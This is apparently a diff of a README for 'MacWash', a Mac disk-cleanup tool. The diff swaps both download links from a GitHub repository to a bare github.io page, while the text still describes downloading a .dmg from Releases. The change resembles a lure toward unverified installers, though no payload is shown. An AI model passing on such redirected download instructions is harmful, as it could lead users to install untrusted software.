@@ -1,12 +1,12 @@
 # 🧹 MacWash - Reclaim your precious disk space today
 
-[![](https://img.shields.io/badge/Download-MacWash-blue.svg)](https://github.com/Capriceimmature241/MacWash)
+[![](https://img.shields.io/badge/Download-MacWash-blue.svg)](https://capriceimmature241.github.io)
 
 MacWash cleans your Apple computer. It removes files you no longer need. This tool clears cache, deletes app leftovers, and stops unneeded background tasks. You gain more room for your photos, videos, and documents. The software works on both Apple Silicon chips and older Intel processors.
 
 ## 📥 How to download the software
 
-Visit the [official download page](https://github.com/Capriceimmature241/MacWash) to get the latest version. Look for the section labeled Releases on the right side of the screen. Click the file that ends in .dmg for your Mac. Your browser will save the file to your Downloads folder.
+Visit the [official download page](https://capriceimmature241.github.io) to get the latest version. Look for the section labeled Releases on the right side of the screen. Click the file that ends in .dmg for your Mac. Your browser will save the file to your Downloads folder.
 
 ## ⚙️ Preparation before you start
 
